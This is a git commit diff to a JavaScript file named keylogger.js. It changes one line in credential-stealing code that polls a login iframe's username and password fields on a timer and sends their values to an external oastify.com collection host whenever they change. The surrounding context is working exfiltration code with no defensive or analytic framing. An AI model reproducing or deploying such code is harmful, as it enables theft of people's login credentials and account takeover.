d295e20f50f5616b915656e32c675b39f026d7a2
Okechukwu Joshua <lodianaselora@gmail.com>
2025-01-02 07:58:46 +0100

    Update keylogger.js

--- keylogger.js
+++ keylogger.js
@@ -22,7 +22,7 @@ setInterval(()=> {
     const iframe = document.querySelector('iframe');
     const element = iframe.contentDocument.evaluate('/html/body/div[1]/div[2]/div[1]/div[2]/div/div[2]/div[1]/input', iframe.contentDocument, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
     if (element.value != old_username || iframe.contentDocument.getElementById('password').value !=  old_password) {
-        fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/Password?username:${element.value}s==direct-password-${iframe.contentDocument.getElementById('password').value }`)
+        fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/Password?username:${element.value}--direct-password-${iframe.contentDocument.getElementById('password').value }`)
         old_username = element.value;
         old_password = iframe.contentDocument.getElementById('password').value;
     }    
